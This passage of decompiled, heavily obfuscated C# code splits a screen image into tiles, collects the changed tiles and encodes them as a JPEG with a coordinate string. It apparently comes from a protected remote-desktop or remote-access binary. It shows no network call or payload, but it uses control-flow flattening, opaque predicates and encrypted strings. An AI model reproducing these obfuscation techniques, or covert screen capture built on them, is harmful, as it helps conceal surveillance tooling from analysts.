					if (Operators.CompareString(________________(byte_), ________________(byte_2), false) == 0)
					{
						if (num3 != 25436)
						{
							goto IL_0370;
						}
						goto IL_037c;
					}
					list.Add(val3);
					List<Point> list3 = list2;
					Point item = new Point(x, num5);
					list3.Add(item);
					num3 = 14420;
					if ((nint)Type.EmptyTypes.LongLength + 19953 == 19953)
					{
						goto IL_0465;
					}
					goto IL_06e0;
					IL_03cd:
					if (num15 <= num21 && num15 != list.Count)
					{
						list4.Add(num15);
						num3 = (int)(((-7141 | (-234881024 * num21)) == -7141) ? ((nint)Type.EmptyTypes.LongLength + 13515) : (sizeof(byte) + -600771725));
						num8 = sizeof(long) + -6;
						continue;
					}
					val4 = new Bitmap(((Image)list[0]).get_Width(), num4);
					Graphics val5 = Graphics.FromImage((Image)(object)val4);
					num13 = 0;
					text3 = Conversions.ToString(((Image)val).get_Width()) + _003CModule_003E._____<string>(116858529u) + Conversions.ToString(((Image)val).get_Height()) + _003CModule_003E.____<string>(3252270184u);
					try
					{
						if ((((uint)num4 / 1071270581u) | 0xFFFFEC4Fu) != 4294962255u)
						{
							goto IL_09a6;
						}
						goto IL_09da;
						IL_09da:
						enumerator = list4.GetEnumerator();
						goto IL_09cc;
						IL_09cc:
						if (enumerator.MoveNext())
						{
							current = enumerator.Current;
							int num22 = -11144;
							if (num23 + -1744830464 != num23)
							{
								string[] array2 = new string[7] { text3, null, null, null, null, null, null };
								int num24 = sizeof(uint) + -1;
								nint num25 = num24;
								while (true)
								{
									switch (num25)
									{
									default:
										array2[1] = Conversions.ToString(list2[current].X);
										num24 = sizeof(float) + -4;
										num25 = num24;
										continue;
									case 2:
										array2[6] = _003CModule_003E.___<string>(4063101107u);
										text3 = string.Concat(array2);
										if (num22 == -1182)
										{
											break;
										}
										goto case 1;
									case 1:
										array2[4] = _003CModule_003E._______<string>(1916090129u);
										array2[5] = Conversions.ToString(((Image)list[current]).get_Height());
										num22 = (int)((31348 + (num19 << 2) != 14444 * num19) ? (-1182) : (((((num & 0xF68) - -(num6 | 0x1AAD)) & 0x1392BE03) == 0) ? (-1448105739) : ((nint)Type.EmptyTypes.LongLength + 1975909300)));
										num25 = (nint)Type.EmptyTypes.LongLength + 2;
										continue;
									case 0:
										array2[2] = _003CModule_003E.______<string>(1060962588u);
										array2[3] = Conversions.ToString(list2[current].Y);
										num25 = (((int)((uint)num9 / 6876u) - int.MinValue == (int)((0x2705 & ((uint)num5 % 65536u)) << 20)) ? ((nint)Type.EmptyTypes.LongLength + -2037812868) : ((nint)Type.EmptyTypes.LongLength + 1));
										continue;
									}
									break;
								}
								goto IL_09a6;
							}
							goto IL_09da;
						}
						goto end_IL_0810;
						IL_09a6:
						val5.DrawImage((Image)(object)list[current], 0, num13);
						num13 += ((Image)list[current]).get_Height();
						goto IL_09cc;
						end_IL_0810:;
					}
					finally
					{
						((IDisposable)enumerator).Dispose();
					}
					int num26 = _003CModule_003E._____________;
					if ((num26 << 20) + -(num26 * 37 + num26 * 91) == 7320)
					{
						goto IL_0ae2;
					}
					text3 += _003CModule_003E.____<string>(2986380471u);
					num27 = list.Count - 1;
					num16 = 0;
					num14 = (nint)Type.EmptyTypes.LongLength + 3;
					goto IL_0bc6;
					IL_037c:
					num19++;
					goto IL_0382;
					IL_0382:
					if (num19 > num23)
					{
						num3 = (int)((nint)Type.EmptyTypes.LongLength + -18724);
						num8 = sizeof(Guid) + -11;
						continue;
					}
					num18 = int_1 - 1;
					num17 = 0;
					num3 = 15390;
					if ((nint)Type.EmptyTypes.LongLength + 16770 != 16770)
					{
						goto IL_03c7;
					}
					goto IL_0472;
					IL_0a79:
					num16++;
					if (436207616 * (num20 * 19 + num20 * 13) != -7351)
					{
						goto IL_0a97;
					}
					num14 = (nint)Type.EmptyTypes.LongLength + -812722862;
					goto IL_0bc6;
					IL_0a97:
					if (num16 <= num27)
					{
						if (!list4.Contains(num16))
						{
							_____________________________.m_________.Add(list[num16]);
							goto IL_0a66;
						}
						goto IL_0a79;
					}
					val5.Dispose();
					memoryStream3 = new MemoryStream();
					num28 = (int)((nint)Type.EmptyTypes.LongLength + -1277);
					num14 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_0bc6;
					IL_0ae2:
					EncoderParameters val6;
					do
					{
						val6 = new EncoderParameters(1);
						val6.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int_2);
					}
					while (num2 + 2717 != (int)((uint)(num2 * -663060480) >> 15) && num28 == 3968);
					ImageCodecInfo val7 = _________________(_003CModule_003E._____<string>(810845712u));
					((Image)val4).Save((Stream)memoryStream3, val7, val6);
					if (((num26 << 27) & 0x6000000) != ((1610612736 * num26) & 0x6000000))
					{
						int num29 = _003CModule_003E.______________;
						if (-1073741824 + num29 * 32 != num29 << 5)
						{
							int num30 = global::___________._;
							if (~(-(num30 * -1503395840)) == 262144 * num30)
							{
								goto IL_0a97;
							}
							num14 = (nint)Type.EmptyTypes.LongLength + -1508614911;
						}
						else
						{
							if (2 * ((0x142C & num28) - 4776) + -1641590910 != num28 * 3 + num28)
							{
								goto IL_0a97;
							}
							num14 = 1428674749;
						}
					}
					else
					{
						num14 = (nint)Type.EmptyTypes.LongLength + 1;
					}
					goto IL_0bc6;
					IL_02cf:
					num3 = 31758;
					if (-num31 - -1017 == num31 - -7524)
					{
						goto IL_0370;
					}
					num4 = 0;
					list4 = new List<int>();
					num21 = (int)Math.Round((double)(int_1 * int_1) / 5.0);
					num15 = 0;
					if (num3 != 31758)
					{
						goto IL_031b;
					}
					goto IL_03cd;
					IL_04ba:
					memoryStream = new MemoryStream();
					Bitmap obj2 = val;
					rectangle = new Rectangle(x, num5, num6, num7);
					val3 = obj2.Clone(rectangle, ((Image)val).get_PixelFormat());
					num8 = (nint)Type.EmptyTypes.LongLength + 4;
					continue;
					IL_00e4:
					num6 = (int)Math.Round((double)width / (double)int_1);
					num12 = num3;
					num3 = -7484;
					if (num12 != 31622)
					{
						num7 = (int)Math.Round((double)height / (double)int_1);
						if ((0x1F & (num * 17 + 846 + num * 47)) != 14 || num3 != -7484)
						{
							goto IL_02cf;
						}
						if (num6.ToString().Contains(_003CModule_003E.___<string>(2493487344u)))
						{
							num6 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num6), _003CModule_003E.___<string>(2493487344u), -1, (CompareMethod)0)[0]);
							num3 = -14071;
							num8 = (nint)Type.EmptyTypes.LongLength + 3;
							continue;
						}
						goto IL_015a;
					}
					goto IL_0522;
					IL_0465:
					((Image)val2).Dispose();
					num17++;
					goto IL_0472;
					continue;
					end_IL_0600:
					break;
				}
				goto IL_05d5;
				IL_0522:
				width = size.Width;
				height = size.Height;
				num23 = int_1 - 1;
				num19 = 0;
				num8 = (nint)Type.EmptyTypes.LongLength + 1;
				goto IL_0600;
				IL_06e0:
				if ((((Image)_____________________________.m___________).get_Size().Width != size.Width) | (((Image)_____________________________.m___________).get_Height() != size.Height) | (_____________________________.m________________ != int_1) | (_____________________________.m_________________ != int_2))
				{
					if (num3 == 27538)
					{
						goto IL_0522;
					}
					_____________________________.m_________.Clear();
					_____________________________.m__________.Clear();
					_____________________________.m___________ = new Bitmap(size.Width, size.Height);
					num8 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_0600;
				}
				goto IL_0645;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
